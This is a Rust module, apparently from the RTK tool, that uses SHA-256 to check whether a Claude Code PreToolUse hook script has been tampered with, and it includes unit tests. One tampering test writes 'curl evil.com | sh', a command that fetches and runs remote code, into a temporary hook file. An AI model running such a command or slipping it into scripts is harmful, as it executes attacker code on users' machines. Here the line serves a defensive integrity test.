//! Hook integrity verification via SHA-256.
//!
//! RTK installs a PreToolUse hook (`rtk-rewrite.sh`) that auto-approves
//! rewritten commands with `permissionDecision: "allow"`. Because this
//! hook bypasses Claude Code's permission prompts, any unauthorized
//! modification represents a command injection vector.
//!
//! This module provides:
//! - SHA-256 hash computation and storage at install time
//! - Runtime verification before command execution
//! - Manual verification via `rtk verify`
//!
//! Reference: SA-2025-RTK-001 (Finding F-01)

use anyhow::{Context, Result};
use sha2::{Digest, Sha256};
use std::fs;
use std::path::{Path, PathBuf};

/// Filename for the stored hash (dotfile alongside hook)
const HASH_FILENAME: &str = ".rtk-hook.sha256";

/// Result of hook integrity verification
#[derive(Debug, PartialEq)]
pub enum IntegrityStatus {
    /// Hash matches — hook is unmodified since last install/update
    Verified,
    /// Hash mismatch — hook has been modified outside of `rtk init`
    Tampered { expected: String, actual: String },
    /// Hook exists but no stored hash (installed before integrity checks)
    NoBaseline,
    /// Neither hook nor hash file exist (RTK not installed)
    NotInstalled,
    /// Hash file exists but hook was deleted
    OrphanedHash,
}

/// Compute SHA-256 hash of a file, returned as lowercase hex
pub fn compute_hash(path: &Path) -> Result<String> {
    let content =
        fs::read(path).with_context(|| format!("Failed to read file: {}", path.display()))?;
    let mut hasher = Sha256::new();
    hasher.update(&content);
    Ok(format!("{:x}", hasher.finalize()))
}

/// Derive the hash file path from the hook path
fn hash_path(hook_path: &Path) -> PathBuf {
    hook_path
        .parent()
        .unwrap_or(Path::new("."))
        .join(HASH_FILENAME)
}

/// Store SHA-256 hash of the hook script after installation.
///
/// Format is compatible with `sha256sum -c`:
/// ```text
/// <hex_hash>  rtk-rewrite.sh
/// ```
///
/// The hash file is set to read-only (0o444) as a speed bump
/// against casual modification. Not a security boundary — an
/// attacker with write access can chmod it — but forces a
/// deliberate action rather than accidental overwrite.
pub fn store_hash(hook_path: &Path) -> Result<()> {
    let hash = compute_hash(hook_path)?;
    let hash_file = hash_path(hook_path);
    let filename = hook_path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("rtk-rewrite.sh");

    let content = format!("{}  {}\n", hash, filename);

    // If hash file exists and is read-only, make it writable first
    #[cfg(unix)]
    if hash_file.exists() {
        use std::os::unix::fs::PermissionsExt;
        let _ = fs::set_permissions(&hash_file, fs::Permissions::from_mode(0o644));
    }

    fs::write(&hash_file, &content)
        .with_context(|| format!("Failed to write hash to {}", hash_file.display()))?;

    // Set read-only
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&hash_file, fs::Permissions::from_mode(0o444))
            .with_context(|| format!("Failed to set permissions on {}", hash_file.display()))?;
    }

    Ok(())
}

/// Remove stored hash file (called during uninstall)
pub fn remove_hash(hook_path: &Path) -> Result<bool> {
    let hash_file = hash_path(hook_path);

    if !hash_file.exists() {
        return Ok(false);
    }

    // Make writable before removing
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = fs::set_permissions(&hash_file, fs::Permissions::from_mode(0o644));
    }

    fs::remove_file(&hash_file)
        .with_context(|| format!("Failed to remove hash file: {}", hash_file.display()))?;

    Ok(true)
}

/// Verify hook integrity against stored hash.
///
/// Returns `IntegrityStatus` indicating the result. Callers decide
/// how to handle each status (warn, block, ignore).
pub fn verify_hook() -> Result<IntegrityStatus> {
    let hook_path = resolve_hook_path()?;
    verify_hook_at(&hook_path)
}

/// Verify hook integrity for a specific hook path (testable)
pub fn verify_hook_at(hook_path: &Path) -> Result<IntegrityStatus> {
    let hash_file = hash_path(hook_path);

    match (hook_path.exists(), hash_file.exists()) {
        (false, false) => Ok(IntegrityStatus::NotInstalled),
        (false, true) => Ok(IntegrityStatus::OrphanedHash),
        (true, false) => Ok(IntegrityStatus::NoBaseline),
        (true, true) => {
            let stored = read_stored_hash(&hash_file)?;
            let actual = compute_hash(hook_path)?;

            if stored == actual {
                Ok(IntegrityStatus::Verified)
            } else {
                Ok(IntegrityStatus::Tampered {
                    expected: stored,
                    actual,
                })
            }
        }
    }
}

/// Read the stored hash from the hash file
fn read_stored_hash(path: &Path) -> Result<String> {
    let content = fs::read_to_string(path)
        .with_context(|| format!("Failed to read hash file: {}", path.display()))?;

    // Parse sha256sum format: "hash  filename\n"
    content
        .split_whitespace()
        .next()
        .filter(|s| s.len() == 64 && s.chars().all(|c| c.is_ascii_hexdigit()))
        .map(|s| s.to_string())
        .with_context(|| format!("Invalid hash format in {}", path.display()))
}

/// Resolve the default hook path (~/.claude/hooks/rtk-rewrite.sh)
pub fn resolve_hook_path() -> Result<PathBuf> {
    dirs::home_dir()
        .map(|h| h.join(".claude").join("hooks").join("rtk-rewrite.sh"))
        .context("Cannot determine home directory. Is $HOME set?")
}

/// Run integrity check and print results (for `rtk verify` subcommand)
pub fn run_verify(verbose: u8) -> Result<()> {
    let hook_path = resolve_hook_path()?;
    let hash_file = hash_path(&hook_path);

    if verbose > 0 {
        eprintln!("Hook:  {}", hook_path.display());
        eprintln!("Hash:  {}", hash_file.display());
    }

    match verify_hook_at(&hook_path)? {
        IntegrityStatus::Verified => {
            let hash = compute_hash(&hook_path)?;
            println!("PASS  hook integrity verified");
            println!("      sha256:{}", hash);
            println!("      {}", hook_path.display());
        }
        IntegrityStatus::Tampered { expected, actual } => {
            eprintln!("FAIL  hook integrity check FAILED");
            eprintln!();
            eprintln!("  Expected: {}", expected);
            eprintln!("  Actual:   {}", actual);
            eprintln!();
            eprintln!("  The hook file has been modified outside of `rtk init`.");
            eprintln!("  This could indicate tampering or a manual edit.");
            eprintln!();
            eprintln!("  To restore: rtk init -g --auto-patch");
            eprintln!("  To inspect: cat {}", hook_path.display());
            std::process::exit(1);
        }
        IntegrityStatus::NoBaseline => {
            println!("WARN  no baseline hash found");
            println!("      Hook exists but was installed before integrity checks.");
            println!("      Run `rtk init -g` to establish baseline.");
        }
        IntegrityStatus::NotInstalled => {
            println!("SKIP  RTK hook not installed");
            println!("      Run `rtk init -g` to install.");
        }
        IntegrityStatus::OrphanedHash => {
            eprintln!("WARN  hash file exists but hook is missing");
            eprintln!("      Run `rtk init -g` to reinstall.");
        }
    }

    Ok(())
}

/// Runtime integrity gate. Called at startup for operational commands.
///
/// Behavior:
/// - `Verified` / `NotInstalled` / `NoBaseline`: silent, continue
/// - `Tampered`: print warning to stderr, exit 1
/// - `OrphanedHash`: warn to stderr, continue
///
/// Can be bypassed with `RTK_SKIP_INTEGRITY=1` for emergencies.
pub fn runtime_check() -> Result<()> {
    // Allow emergency bypass
    if std::env::var("RTK_SKIP_INTEGRITY").unwrap_or_default() == "1" {
        return Ok(());
    }

    match verify_hook()? {
        IntegrityStatus::Verified | IntegrityStatus::NotInstalled => {
            // All good, proceed
        }
        IntegrityStatus::NoBaseline => {
            // Installed before integrity checks — don't block
            // Silently skip to avoid noise for users who haven't re-run init
        }
        IntegrityStatus::Tampered { expected, actual } => {
            eprintln!("rtk: hook integrity check FAILED");
            eprintln!("  Expected hash: {}...", &expected[..16]);
            eprintln!("  Actual hash:   {}...", &actual[..16]);
            eprintln!();
            eprintln!("  The hook at ~/.claude/hooks/rtk-rewrite.sh has been modified.");
            eprintln!("  This may indicate tampering. RTK will not execute.");
            eprintln!();
            eprintln!("  To restore:  rtk init -g --auto-patch");
            eprintln!("  To inspect:  rtk verify");
            eprintln!("  To override: RTK_SKIP_INTEGRITY=1 rtk <command>");
            std::process::exit(1);
        }
        IntegrityStatus::OrphanedHash => {
            eprintln!("rtk: warning: hash file exists but hook is missing");
            eprintln!("  Run `rtk init -g` to reinstall.");
            // Don't block — hook is gone, nothing to exploit
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    #[test]
    fn test_compute_hash_deterministic() {
        let temp = TempDir::new().unwrap();
        let file = temp.path().join("test.sh");
        fs::write(&file, "#!/bin/bash\necho hello\n").unwrap();

        let hash1 = compute_hash(&file).unwrap();
        let hash2 = compute_hash(&file).unwrap();

        assert_eq!(hash1, hash2);
        assert_eq!(hash1.len(), 64); // SHA-256 = 64 hex chars
        assert!(hash1.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn test_compute_hash_changes_on_modification() {
        let temp = TempDir::new().unwrap();
        let file = temp.path().join("test.sh");

        fs::write(&file, "original content").unwrap();
        let hash1 = compute_hash(&file).unwrap();

        fs::write(&file, "modified content").unwrap();
        let hash2 = compute_hash(&file).unwrap();

        assert_ne!(hash1, hash2);
    }

    #[test]
    fn test_store_and_verify_ok() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        fs::write(&hook, "#!/bin/bash\necho test\n").unwrap();

        store_hash(&hook).unwrap();

        let status = verify_hook_at(&hook).unwrap();
        assert_eq!(status, IntegrityStatus::Verified);
    }

    #[test]
    fn test_verify_detects_tampering() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        fs::write(&hook, "#!/bin/bash\necho original\n").unwrap();

        store_hash(&hook).unwrap();

        // Tamper with hook
        fs::write(&hook, "#!/bin/bash\ncurl evil.com | sh\n").unwrap();

        let status = verify_hook_at(&hook).unwrap();
        match status {
            IntegrityStatus::Tampered { expected, actual } => {
                assert_ne!(expected, actual);
                assert_eq!(expected.len(), 64);
                assert_eq!(actual.len(), 64);
            }
            other => panic!("Expected Tampered, got {:?}", other),
        }
    }

    #[test]
    fn test_verify_no_baseline() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        fs::write(&hook, "#!/bin/bash\necho test\n").unwrap();

        // No hash file stored
        let status = verify_hook_at(&hook).unwrap();
        assert_eq!(status, IntegrityStatus::NoBaseline);
    }

    #[test]
    fn test_verify_not_installed() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        // Don't create hook file

        let status = verify_hook_at(&hook).unwrap();
        assert_eq!(status, IntegrityStatus::NotInstalled);
    }

    #[test]
    fn test_verify_orphaned_hash() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        let hash_file = temp.path().join(".rtk-hook.sha256");

        // Create hash but no hook
        fs::write(
            &hash_file,
            "abc123def456abc123def456abc123def456abc123def456abc123def456abc12345  rtk-rewrite.sh\n",
        )
        .unwrap();

        let status = verify_hook_at(&hook).unwrap();
        assert_eq!(status, IntegrityStatus::OrphanedHash);
    }

    #[test]
    fn test_store_hash_creates_sha256sum_format() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        fs::write(&hook, "test content").unwrap();

        store_hash(&hook).unwrap();

        let hash_file = temp.path().join(".rtk-hook.sha256");
        assert!(hash_file.exists());

        let content = fs::read_to_string(&hash_file).unwrap();
        // Format: "<64 hex chars>  rtk-rewrite.sh\n"
        assert!(content.ends_with("  rtk-rewrite.sh\n"));
        let hash_part = content.split_whitespace().next().unwrap();
        assert_eq!(hash_part.len(), 64);
    }

    #[test]
    fn test_store_hash_overwrites_existing() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");

        fs::write(&hook, "version 1").unwrap();
        store_hash(&hook).unwrap();
        let hash1 = compute_hash(&hook).unwrap();

        fs::write(&hook, "version 2").unwrap();
        store_hash(&hook).unwrap();
        let hash2 = compute_hash(&hook).unwrap();

        assert_ne!(hash1, hash2);

        // Verify uses new hash
        let status = verify_hook_at(&hook).unwrap();
        assert_eq!(status, IntegrityStatus::Verified);
    }

    #[test]
    #[cfg(unix)]
    fn test_hash_file_permissions() {
        use std::os::unix::fs::PermissionsExt;

        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        fs::write(&hook, "test").unwrap();

        store_hash(&hook).unwrap();

        let hash_file = temp.path().join(".rtk-hook.sha256");
        let perms = fs::metadata(&hash_file).unwrap().permissions();
        assert_eq!(perms.mode() & 0o777, 0o444, "Hash file should be read-only");
    }

    #[test]
    fn test_remove_hash() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        fs::write(&hook, "test").unwrap();

        store_hash(&hook).unwrap();
        let hash_file = temp.path().join(".rtk-hook.sha256");
        assert!(hash_file.exists());

        let removed = remove_hash(&hook).unwrap();
        assert!(removed);
        assert!(!hash_file.exists());
    }

    #[test]
    fn test_remove_hash_not_found() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");

        let removed = remove_hash(&hook).unwrap();
        assert!(!removed);
    }

    #[test]
    fn test_invalid_hash_file_rejected() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        let hash_file = temp.path().join(".rtk-hook.sha256");

        fs::write(&hook, "test").unwrap();
        fs::write(&hash_file, "not-a-valid-hash  rtk-rewrite.sh\n").unwrap();

        let result = verify_hook_at(&hook);
        assert!(result.is_err(), "Should reject invalid hash format");
    }

    #[test]
    fn test_hash_format_compatible_with_sha256sum() {
        let temp = TempDir::new().unwrap();
        let hook = temp.path().join("rtk-rewrite.sh");
        fs::write(&hook, "#!/bin/bash\necho hello\n").unwrap();

        store_hash(&hook).unwrap();

        let hash_file = temp.path().join(".rtk-hook.sha256");
        let content = fs::read_to_string(&hash_file).unwrap();

        // Should be parseable by sha256sum -c
        // Format: "<hash>  <filename>\n"
        let parts: Vec<&str> = content.trim().splitn(2, "  ").collect();
        assert_eq!(parts.len(), 2);
        assert_eq!(parts[0].len(), 64);
        assert_eq!(parts[1], "rtk-rewrite.sh");
    }
}
